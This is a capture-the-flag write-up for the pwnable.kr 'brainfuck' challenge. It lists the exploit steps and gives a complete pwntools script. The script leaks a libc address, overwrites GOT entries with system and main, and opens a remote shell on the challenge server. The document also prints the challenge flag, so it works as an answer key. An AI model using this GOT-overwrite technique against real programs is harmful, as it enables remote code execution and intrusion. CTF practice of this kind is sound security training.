### Brainfuck 

we were given a brainfuck interpreter , we can do ptr++,ptr--,putchar(*ptr),getchar(*ptr)
1) read string "/bin/sh" into tape( a global variable) 
2) patch stdout@glibc to &tape(--> '/bin/sh')
3) leak setvbuf@libc and calc system add
4) patch setvbuf@libc to system addr
5) patch puts@libc to main addr

```

from pwn import *

libc = ELF("bf_libc.so")

#p = process('./bf')
p = remote('pwnable.kr',9001)


print p.recvlines(2)

payload = ",>"*9+"<"*9+"<"*64+",>"*4+"<"*4+"<"*56+".>"*4+"<"*5+",>"*5+"<"*4+"<"*17+",>"*5+"["

p.sendline(payload)

p.sendline("/bin/sh\x00")
p.sendline(pack(0x804a0a0))

s=p.recv(1)
s+=p.recv(1)
s+=p.recv(1)
s+=p.recv(1)
leak = unpack(s)
libc.address= leak- libc.symbols['setvbuf'];
system = libc.symbols['system']

#system = leak-0x254c0

print "[+] Leak addr: "+hex(leak)
print "[+] System :"+hex(system)

p.sendline(pack(system))

p.sendline(pack(0x08048692))

p.interactive()

```

flag : BrainFuck? what a weird language..
